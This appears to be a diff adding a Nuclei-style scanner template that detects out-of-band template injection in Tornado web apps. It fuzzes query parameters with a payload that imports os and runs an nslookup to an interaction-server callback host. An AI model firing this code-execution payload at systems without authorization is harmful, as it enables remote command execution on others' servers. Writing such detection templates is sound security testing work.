@@ -1,0 +1,40 @@
+id: tornado-oob
+
+info:
+  name: Tornado - Out of Band Template Injection
+  author: 0xAwali,DhiyaneshDK
+  severity: high
+  reference:
+    - https://www.tornadoweb.org/en/stable/guide/templates.html
+    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
+  metadata:
+    verified: true
+  tags: ssti,dast,oast,oob
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - "{%25import+os%25}{{os.system('nslookup+-type=SRV+{{interactsh-url}}')}}"
+
+    skip-variables-check: true
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
+# digest: 4a0a00473045022012f91942417d896ab31e9aa72a6ffef3612fe6f5598d72d4fb206eecb568167b0221009e42d63c16159f47546faa63be102cbc3cf2015f983bd2a8b97be8c8b9fabc28:922c64590222798bb761d5b6d8e72950
